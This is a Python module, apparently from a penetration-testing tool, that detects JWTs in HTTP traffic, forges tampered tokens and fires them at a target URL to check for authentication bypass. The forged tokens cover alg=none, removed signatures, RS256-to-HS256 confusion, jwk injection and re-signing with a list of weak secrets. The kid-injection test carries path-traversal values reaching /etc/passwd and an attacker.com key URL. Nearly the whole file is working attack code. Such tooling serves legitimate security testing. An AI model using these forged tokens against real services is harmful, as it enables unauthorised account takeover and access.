"""JWT (JSON Web Token) manipulation module for authentication bypass testing

This module implements:
- Automatic JWT detection in headers and cookies
- JWT decoding and display of header and payload claims
- JWT tampering capabilities (claim editing, algorithm confusion, parameter injection)
- Automatic JWT replacement in subsequent requests
"""

import base64
import hashlib
import hmac
import json
import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.http_models import Request


class JWTAlgorithm(Enum):
    """JWT signing algorithms"""
    
    HS256 = "HS256"  # HMAC with SHA-256
    HS384 = "HS384"  # HMAC with SHA-384
    HS512 = "HS512"  # HMAC with SHA-512
    RS256 = "RS256"  # RSA with SHA-256
    RS384 = "RS384"  # RSA with SHA-384
    RS512 = "RS512"  # RSA with SHA-512
    ES256 = "ES256"  # ECDSA with SHA-256
    ES384 = "ES384"  # ECDSA with SHA-384
    ES512 = "ES512"  # ECDSA with SHA-512
    PS256 = "PS256"  # RSA-PSS with SHA-256
    PS384 = "PS384"  # RSA-PSS with SHA-384
    PS512 = "PS512"  # RSA-PSS with SHA-512
    NONE = "none"    # No signature (algorithm confusion attack)


@dataclass
class JWTToken:
    """Represents a decoded JWT token"""
    
    raw_token: str
    header: Dict[str, Any]
    payload: Dict[str, Any]
    signature: str
    location: str  # header, cookie, body, query
    parameter_name: str  # Name of header/cookie/parameter containing JWT
    
    @property
    def algorithm(self) -> Optional[str]:
        """Get the algorithm from header"""
        return self.header.get("alg")
    
    @property
    def token_type(self) -> Optional[str]:
        """Get the token type from header"""
        return self.header.get("typ")
    
    @property
    def key_id(self) -> Optional[str]:
        """Get the key ID from header"""
        return self.header.get("kid")
    
    @property
    def jwk(self) -> Optional[Dict]:
        """Get the JWK from header"""
        return self.header.get("jwk")
    
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation"""
        return {
            "raw_token": self.raw_token,
            "header": self.header,
            "payload": self.payload,
            "signature": self.signature,
            "location": self.location,
            "parameter_name": self.parameter_name,
        }


@dataclass
class JWTVulnerability:
    """Represents a JWT vulnerability finding"""
    
    vulnerability_type: str
    severity: str  # critical, high, medium, low
    description: str
    original_token: JWTToken
    exploit_token: Optional[str] = None
    evidence: List[str] = field(default_factory=list)
    metadata: Dict[str, Any] = field(default_factory=dict)


class JWTInspector:
    """JWT detection, decoding, and analysis"""
    
    # JWT pattern: three base64url-encoded parts separated by dots
    JWT_PATTERN = re.compile(
        r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*'
    )
    
    def __init__(self, request_handler: RequestHandler):
        """Initialize JWT inspector
        
        Args:
            request_handler: Request handler for HTTP communication
        """
        self.request_handler = request_handler
        self.detected_tokens: List[JWTToken] = []
    
    def detect_jwt_in_response(self, response: Response) -> List[JWTToken]:
        """Detect JWTs in HTTP response
        
        Args:
            response: HTTP response to analyze
        
        Returns:
            List of detected JWT tokens
        """
        tokens = []
        
        # Check response headers
        for header_name, header_value in response.headers.items():
            if isinstance(header_value, str):
                jwt_tokens = self._extract_jwts_from_text(header_value)
                for jwt_str in jwt_tokens:
                    token = self.decode_jwt(jwt_str)
                    if token:
                        token.location = "header"
                        token.parameter_name = header_name
                        tokens.append(token)
        
        # Check Set-Cookie headers specifically
        set_cookie_header = response.headers.get("Set-Cookie", "")
        if set_cookie_header:
            jwt_tokens = self._extract_jwts_from_text(set_cookie_header)
            for jwt_str in jwt_tokens:
                token = self.decode_jwt(jwt_str)
                if token:
                    token.location = "cookie"
                    # Try to extract cookie name
                    cookie_match = re.search(r'(\w+)=' + re.escape(jwt_str), set_cookie_header)
                    if cookie_match:
                        token.parameter_name = cookie_match.group(1)
                    else:
                        token.parameter_name = "unknown"
                    tokens.append(token)
        
        # Check response body
        jwt_tokens = self._extract_jwts_from_text(response.text)
        for jwt_str in jwt_tokens:
            token = self.decode_jwt(jwt_str)
            if token:
                token.location = "body"
                token.parameter_name = "body"
                tokens.append(token)
        
        # Store detected tokens
        self.detected_tokens.extend(tokens)
        
        return tokens
    
    def detect_jwt_in_request(self, request: Request) -> List[JWTToken]:
        """Detect JWTs in HTTP request
        
        Args:
            request: HTTP request to analyze
        
        Returns:
            List of detected JWT tokens
        """
        tokens = []
        
        # Check request headers
        for header_name, header_value in request.headers.items():
            if isinstance(header_value, str):
                jwt_tokens = self._extract_jwts_from_text(header_value)
                for jwt_str in jwt_tokens:
                    token = self.decode_jwt(jwt_str)
                    if token:
                        token.location = "header"
                        token.parameter_name = header_name
                        tokens.append(token)
        
        # Check cookies
        for cookie_name, cookie_value in request.cookies.items():
            if isinstance(cookie_value, str):
                jwt_tokens = self._extract_jwts_from_text(cookie_value)
                for jwt_str in jwt_tokens:
                    token = self.decode_jwt(jwt_str)
                    if token:
                        token.location = "cookie"
                        token.parameter_name = cookie_name
                        tokens.append(token)
        
        # Check request body if present
        if request.data:
            if isinstance(request.data, str):
                jwt_tokens = self._extract_jwts_from_text(request.data)
                for jwt_str in jwt_tokens:
                    token = self.decode_jwt(jwt_str)
                    if token:
                        token.location = "body"
                        token.parameter_name = "body"
                        tokens.append(token)
        
        return tokens
    
    def _extract_jwts_from_text(self, text: str) -> List[str]:
        """Extract JWT strings from text
        
        Args:
            text: Text to search for JWTs
        
        Returns:
            List of JWT strings
        """
        matches = self.JWT_PATTERN.findall(text)
        return matches
    
    def decode_jwt(self, jwt_string: str) -> Optional[JWTToken]:
        """Decode a JWT token
        
        Args:
            jwt_string: JWT string to decode
        
        Returns:
            JWTToken object if valid, None otherwise
        """
        try:
            # Split JWT into parts
            parts = jwt_string.split('.')
            if len(parts) != 3:
                return None
            
            header_b64, payload_b64, signature_b64 = parts
            
            # Decode header
            header = self._base64url_decode(header_b64)
            if not header:
                return None
            
            # Decode payload
            payload = self._base64url_decode(payload_b64)
            if not payload:
                return None
            
            # Create JWT token object
            token = JWTToken(
                raw_token=jwt_string,
                header=header,
                payload=payload,
                signature=signature_b64,
                location="unknown",
                parameter_name="unknown",
            )
            
            return token
            
        except Exception as e:
            # Not a valid JWT
            return None
    
    def _base64url_decode(self, data: str) -> Optional[Dict[str, Any]]:
        """Decode base64url-encoded JSON data
        
        Args:
            data: Base64url-encoded string
        
        Returns:
            Decoded dictionary or None if invalid
        """
        try:
            # Add padding if needed
            padding = 4 - (len(data) % 4)
            if padding != 4:
                data += '=' * padding
            
            # Decode base64url
            decoded_bytes = base64.urlsafe_b64decode(data)
            
            # Parse JSON
            decoded_json = json.loads(decoded_bytes.decode('utf-8'))
            
            return decoded_json
            
        except Exception:
            return None
    
    def display_token_info(self, token: JWTToken) -> str:
        """Generate human-readable display of JWT token
        
        Args:
            token: JWT token to display
        
        Returns:
            Formatted string representation
        """
        lines = []
        lines.append("=" * 60)
        lines.append("JWT TOKEN DETECTED")
        lines.append("=" * 60)
        lines.append(f"Location: {token.location}")
        lines.append(f"Parameter: {token.parameter_name}")
        lines.append("")
        lines.append("HEADER:")
        lines.append(json.dumps(token.header, indent=2))
        lines.append("")
        lines.append("PAYLOAD:")
        lines.append(json.dumps(token.payload, indent=2))
        lines.append("")
        lines.append(f"SIGNATURE: {token.signature}")
        lines.append("=" * 60)
        
        return "\n".join(lines)


class JWTTamperer:
    """JWT tampering and manipulation capabilities"""
    
    def __init__(self):
        """Initialize JWT tamperer"""
        pass
    
    def edit_claim(
        self,
        token: JWTToken,
        claim_name: str,
        claim_value: Any,
        location: str = "payload"
    ) -> str:
        """Edit a claim in the JWT
        
        Args:
            token: Original JWT token
            claim_name: Name of claim to edit
            claim_value: New value for claim
            location: "header" or "payload"
        
        Returns:
            Modified JWT string
        """
        # Copy header and payload
        new_header = token.header.copy()
        new_payload = token.payload.copy()
        
        # Edit the claim
        if location == "header":
            new_header[claim_name] = claim_value
        else:
            new_payload[claim_name] = claim_value
        
        # Reconstruct JWT (without valid signature)
        return self._build_jwt(new_header, new_payload, token.signature)
    
    def algorithm_confusion_none(self, token: JWTToken) -> str:
        """Create JWT with algorithm set to 'none' (no signature)
        
        Args:
            token: Original JWT token
        
        Returns:
            Modified JWT string with alg=none
        """
        # Copy header and payload
        new_header = token.header.copy()
        new_payload = token.payload.copy()
        
        # Set algorithm to none
        new_header["alg"] = "none"
        
        # Build JWT with empty signature
        return self._build_jwt(new_header, new_payload, "")
    
    def algorithm_confusion_hs256(self, token: JWTToken) -> str:
        """Create JWT with algorithm changed to HS256 (for RS256 -> HS256 confusion)
        
        Args:
            token: Original JWT token
        
        Returns:
            Modified JWT string with alg=HS256
        """
        # Copy header and payload
        new_header = token.header.copy()
        new_payload = token.payload.copy()
        
        # Change algorithm to HS256
        new_header["alg"] = "HS256"
        
        # Build JWT (signature will be invalid, but that's the point)
        return self._build_jwt(new_header, new_payload, token.signature)
    
    def modify_kid(self, token: JWTToken, new_kid: str) -> str:
        """Modify the 'kid' (Key ID) parameter
        
        Args:
            token: Original JWT token
            new_kid: New kid value
        
        Returns:
            Modified JWT string
        """
        # Copy header and payload
        new_header = token.header.copy()
        new_payload = token.payload.copy()
        
        # Modify kid
        new_header["kid"] = new_kid
        
        # Reconstruct JWT
        return self._build_jwt(new_header, new_payload, token.signature)
    
    def inject_jwk(self, token: JWTToken, jwk: Dict[str, Any]) -> str:
        """Inject a JWK (JSON Web Key) into the header
        
        Args:
            token: Original JWT token
            jwk: JWK to inject
        
        Returns:
            Modified JWT string
        """
        # Copy header and payload
        new_header = token.header.copy()
        new_payload = token.payload.copy()
        
        # Inject JWK
        new_header["jwk"] = jwk
        
        # Reconstruct JWT
        return self._build_jwt(new_header, new_payload, token.signature)
    
    def remove_signature(self, token: JWTToken) -> str:
        """Remove the signature from JWT
        
        Args:
            token: Original JWT token
        
        Returns:
            Modified JWT string without signature
        """
        # Build JWT with empty signature
        return self._build_jwt(token.header, token.payload, "")
    
    def sign_with_key(
        self,
        token: JWTToken,
        key: str,
        algorithm: str = "HS256"
    ) -> str:
        """Sign JWT with a specific key
        
        Args:
            token: Original JWT token
            key: Signing key
            algorithm: Algorithm to use (default: HS256)
        
        Returns:
            Signed JWT string
        """
        # Copy header and payload
        new_header = token.header.copy()
        new_payload = token.payload.copy()
        
        # Set algorithm
        new_header["alg"] = algorithm
        
        # Encode header and payload
        header_b64 = self._base64url_encode(json.dumps(new_header, separators=(',', ':')))
        payload_b64 = self._base64url_encode(json.dumps(new_payload, separators=(',', ':')))
        
        # Create signing input
        signing_input = f"{header_b64}.{payload_b64}"
        
        # Sign based on algorithm
        if algorithm.startswith("HS"):
            # HMAC signature
            if algorithm == "HS256":
                signature = hmac.new(
                    key.encode('utf-8'),
                    signing_input.encode('utf-8'),
                    hashlib.sha256
                ).digest()
            elif algorithm == "HS384":
                signature = hmac.new(
                    key.encode('utf-8'),
                    signing_input.encode('utf-8'),
                    hashlib.sha384
                ).digest()
            elif algorithm == "HS512":
                signature = hmac.new(
                    key.encode('utf-8'),
                    signing_input.encode('utf-8'),
                    hashlib.sha512
                ).digest()
            else:
                raise ValueError(f"Unsupported algorithm: {algorithm}")
            
            # Encode signature
            signature_b64 = self._base64url_encode(signature)
            
            return f"{signing_input}.{signature_b64}"
        else:
            # For RSA/ECDSA, we'd need cryptography library
            # For now, just return unsigned token
            return f"{signing_input}.{token.signature}"
    
    def _build_jwt(
        self,
        header: Dict[str, Any],
        payload: Dict[str, Any],
        signature: str
    ) -> str:
        """Build JWT string from components
        
        Args:
            header: JWT header dictionary
            payload: JWT payload dictionary
            signature: Base64url-encoded signature
        
        Returns:
            JWT string
        """
        # Encode header and payload
        header_b64 = self._base64url_encode(json.dumps(header, separators=(',', ':')))
        payload_b64 = self._base64url_encode(json.dumps(payload, separators=(',', ':')))
        
        # Build JWT
        return f"{header_b64}.{payload_b64}.{signature}"
    
    def _base64url_encode(self, data: Any) -> str:
        """Encode data as base64url
        
        Args:
            data: Data to encode (string or bytes)
        
        Returns:
            Base64url-encoded string
        """
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # Encode and remove padding
        encoded = base64.urlsafe_b64encode(data).decode('utf-8')
        return encoded.rstrip('=')


class JWTReplacer:
    """Automatic JWT replacement in requests"""
    
    def __init__(self, request_handler: RequestHandler):
        """Initialize JWT replacer
        
        Args:
            request_handler: Request handler for HTTP communication
        """
        self.request_handler = request_handler
        self.replacement_tokens: Dict[str, str] = {}  # Maps original token to replacement
    
    def register_replacement(self, original_token: str, replacement_token: str):
        """Register a JWT replacement
        
        Args:
            original_token: Original JWT string
            replacement_token: Replacement JWT string
        """
        self.replacement_tokens[original_token] = replacement_token
    
    def apply_replacements(self, request: Request) -> Request:
        """Apply JWT replacements to a request
        
        Args:
            request: Original request
        
        Returns:
            Modified request with JWT replacements
        """
        # Create a copy of the request
        modified_request = Request(
            method=request.method,
            url=request.url,
            headers=request.headers.copy(),
            data=request.data,
            cookies=request.cookies.copy(),
            proxy=request.proxy,
            timeout=request.timeout,
            follow_redirects=request.follow_redirects,
            http2=request.http2,
        )
        
        # Replace JWTs in headers
        for header_name, header_value in modified_request.headers.items():
            if isinstance(header_value, str):
                for original, replacement in self.replacement_tokens.items():
                    if original in header_value:
                        modified_request.headers[header_name] = header_value.replace(
                            original, replacement
                        )
        
        # Replace JWTs in cookies
        for cookie_name, cookie_value in modified_request.cookies.items():
            if isinstance(cookie_value, str):
                for original, replacement in self.replacement_tokens.items():
                    if original in cookie_value:
                        modified_request.cookies[cookie_name] = cookie_value.replace(
                            original, replacement
                        )
        
        # Replace JWTs in body
        if isinstance(modified_request.data, str):
            for original, replacement in self.replacement_tokens.items():
                if original in modified_request.data:
                    modified_request.data = modified_request.data.replace(
                        original, replacement
                    )
        
        return modified_request
    
    def clear_replacements(self):
        """Clear all registered replacements"""
        self.replacement_tokens.clear()


class JWTVulnerabilityScanner:
    """Scan for common JWT vulnerabilities"""
    
    def __init__(self, request_handler: RequestHandler):
        """Initialize vulnerability scanner
        
        Args:
            request_handler: Request handler for HTTP communication
        """
        self.request_handler = request_handler
        self.inspector = JWTInspector(request_handler)
        self.tamperer = JWTTamperer()
    
    async def scan_token(
        self,
        token: JWTToken,
        test_url: str,
        test_method: str = "GET",
        test_headers: Optional[Dict[str, str]] = None,
    ) -> List[JWTVulnerability]:
        """Scan a JWT token for vulnerabilities
        
        Args:
            token: JWT token to scan
            test_url: URL to test against
            test_method: HTTP method to use
            test_headers: Additional headers
        
        Returns:
            List of discovered vulnerabilities
        """
        vulnerabilities = []
        
        # Test 1: Algorithm confusion (none)
        vuln = await self._test_algorithm_none(token, test_url, test_method, test_headers)
        if vuln:
            vulnerabilities.append(vuln)
        
        # Test 2: Missing signature
        vuln = await self._test_missing_signature(token, test_url, test_method, test_headers)
        if vuln:
            vulnerabilities.append(vuln)
        
        # Test 3: Weak secret (common keys)
        vuln = await self._test_weak_secret(token, test_url, test_method, test_headers)
        if vuln:
            vulnerabilities.append(vuln)
        
        # Test 4: Kid injection
        vuln = await self._test_kid_injection(token, test_url, test_method, test_headers)
        if vuln:
            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    async def _test_algorithm_none(
        self,
        token: JWTToken,
        test_url: str,
        test_method: str,
        test_headers: Optional[Dict[str, str]],
    ) -> Optional[JWTVulnerability]:
        """Test for algorithm confusion with 'none'
        
        Args:
            token: JWT token to test
            test_url: URL to test against
            test_method: HTTP method
            test_headers: Additional headers
        
        Returns:
            JWTVulnerability if vulnerable, None otherwise
        """
        # Create token with alg=none
        exploit_token = self.tamperer.algorithm_confusion_none(token)
        
        # Test the token
        headers = test_headers.copy() if test_headers else {}
        if token.location == "header":
            headers[token.parameter_name] = f"Bearer {exploit_token}"
        
        try:
            response = await self.request_handler.send_request(
                method=test_method,
                url=test_url,
                headers=headers,
            )
            
            # Check if request was successful (not 401/403)
            if response.status_code not in [401, 403]:
                return JWTVulnerability(
                    vulnerability_type="algorithm_confusion_none",
                    severity="critical",
                    description="JWT accepts algorithm 'none' - signature verification bypassed",
                    original_token=token,
                    exploit_token=exploit_token,
                    evidence=[
                        f"Modified JWT with alg=none accepted",
                        f"Response status: {response.status_code}",
                        "Signature verification is not enforced",
                    ],
                )
        except Exception:
            pass
        
        return None
    
    async def _test_missing_signature(
        self,
        token: JWTToken,
        test_url: str,
        test_method: str,
        test_headers: Optional[Dict[str, str]],
    ) -> Optional[JWTVulnerability]:
        """Test for missing signature acceptance
        
        Args:
            token: JWT token to test
            test_url: URL to test against
            test_method: HTTP method
            test_headers: Additional headers
        
        Returns:
            JWTVulnerability if vulnerable, None otherwise
        """
        # Create token without signature
        exploit_token = self.tamperer.remove_signature(token)
        
        # Test the token
        headers = test_headers.copy() if test_headers else {}
        if token.location == "header":
            headers[token.parameter_name] = f"Bearer {exploit_token}"
        
        try:
            response = await self.request_handler.send_request(
                method=test_method,
                url=test_url,
                headers=headers,
            )
            
            # Check if request was successful
            if response.status_code not in [401, 403]:
                return JWTVulnerability(
                    vulnerability_type="missing_signature",
                    severity="critical",
                    description="JWT without signature is accepted",
                    original_token=token,
                    exploit_token=exploit_token,
                    evidence=[
                        f"JWT without signature accepted",
                        f"Response status: {response.status_code}",
                    ],
                )
        except Exception:
            pass
        
        return None
    
    async def _test_weak_secret(
        self,
        token: JWTToken,
        test_url: str,
        test_method: str,
        test_headers: Optional[Dict[str, str]],
    ) -> Optional[JWTVulnerability]:
        """Test for weak signing secret
        
        Args:
            token: JWT token to test
            test_url: URL to test against
            test_method: HTTP method
            test_headers: Additional headers
        
        Returns:
            JWTVulnerability if vulnerable, None otherwise
        """
        # Common weak secrets
        weak_secrets = [
            "secret",
            "password",
            "123456",
            "admin",
            "jwt",
            "key",
            "",
        ]
        
        for secret in weak_secrets:
            try:
                # Sign token with weak secret
                exploit_token = self.tamperer.sign_with_key(token, secret)
                
                # Test the token
                headers = test_headers.copy() if test_headers else {}
                if token.location == "header":
                    headers[token.parameter_name] = f"Bearer {exploit_token}"
                
                response = await self.request_handler.send_request(
                    method=test_method,
                    url=test_url,
                    headers=headers,
                )
                
                # Check if request was successful
                if response.status_code not in [401, 403]:
                    return JWTVulnerability(
                        vulnerability_type="weak_secret",
                        severity="critical",
                        description=f"JWT uses weak signing secret: '{secret}'",
                        original_token=token,
                        exploit_token=exploit_token,
                        evidence=[
                            f"Weak secret found: {secret}",
                            f"Response status: {response.status_code}",
                        ],
                        metadata={"secret": secret},
                    )
            except Exception:
                continue
        
        return None
    
    async def _test_kid_injection(
        self,
        token: JWTToken,
        test_url: str,
        test_method: str,
        test_headers: Optional[Dict[str, str]],
    ) -> Optional[JWTVulnerability]:
        """Test for kid parameter injection
        
        Args:
            token: JWT token to test
            test_url: URL to test against
            test_method: HTTP method
            test_headers: Additional headers
        
        Returns:
            JWTVulnerability if vulnerable, None otherwise
        """
        # Test path traversal in kid
        malicious_kids = [
            "../../../dev/null",
            "/dev/null",
            "../../../../../../etc/passwd",
            "http://attacker.com/key",
        ]
        
        for kid in malicious_kids:
            try:
                # Modify kid parameter
                exploit_token = self.tamperer.modify_kid(token, kid)
                
                # Test the token
                headers = test_headers.copy() if test_headers else {}
                if token.location == "header":
                    headers[token.parameter_name] = f"Bearer {exploit_token}"
                
                response = await self.request_handler.send_request(
                    method=test_method,
                    url=test_url,
                    headers=headers,
                )
                
                # Check for different response (might indicate injection)
                if response.status_code not in [401, 403, 500]:
                    return JWTVulnerability(
                        vulnerability_type="kid_injection",
                        severity="high",
                        description=f"JWT kid parameter may be vulnerable to injection",
                        original_token=token,
                        exploit_token=exploit_token,
                        evidence=[
                            f"Modified kid: {kid}",
                            f"Response status: {response.status_code}",
                            "Kid parameter may allow path traversal or injection",
                        ],
                        metadata={"kid": kid},
                    )
            except Exception:
                continue
        
        return None
